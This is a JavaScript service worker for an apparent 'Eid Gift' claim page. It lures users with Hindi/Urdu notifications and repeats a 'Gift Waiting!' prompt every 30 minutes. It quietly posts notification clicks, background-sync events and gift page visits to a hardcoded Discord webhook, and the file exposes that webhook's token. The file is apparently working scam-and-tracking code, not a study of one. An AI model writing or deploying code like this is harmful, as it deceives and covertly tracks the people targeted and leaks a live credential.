const CACHE = 'eid-v1';
const WEBHOOK = 'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg';

self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

// Push notification
self.addEventListener('push', e => {
  let data = e.data?.json() || {};
  e.waitUntil(
    self.registration.showNotification(data.title || '🎁 Eid Gift', {
      body: data.body || 'Aapka gift ready hai!',
      icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'%230a5c0a\'%3E🎁%3C/text%3E%3C/svg%3E',
      badge: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3C/svg%3E',
      vibrate: [200,100,200],
      requireInteraction: true,
      data: { url: '/' }
    })
  );
});

// Notification click
self.addEventListener('notificationclick', e => {
  e.notification.close();
  e.waitUntil(clients.openWindow('/'));
  fetch(WEBHOOK, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      content: '👆 User clicked',
      embeds: [{
        title: 'Notification Click',
        timestamp: new Date().toISOString()
      }]
    })
  }).catch(()=>{});
});

// Background sync
self.addEventListener('sync', e => {
  if(e.tag === 'send') {
    e.waitUntil(
      fetch(WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          content: '📊 Background Sync',
          embeds: [{
            title: 'User Active',
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(()=>{})
    );
  }
});

// Periodic reminders (30 min)
setInterval(() => {
  self.registration.showNotification('⏰ Gift Waiting!', {
    body: 'Abhi claim karo',
    tag: 'remind',
    requireInteraction: true
  });
}, 1800000);

// Collect data
self.addEventListener('fetch', e => {
  if(e.request.url.includes('gift')) {
    e.waitUntil(
      fetch(WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          content: '🌐 Visit',
          embeds: [{
            title: 'Page View',
            timestamp: new Date().toISOString()
          }]
        })
      }).catch(()=>{})
    );
  }
});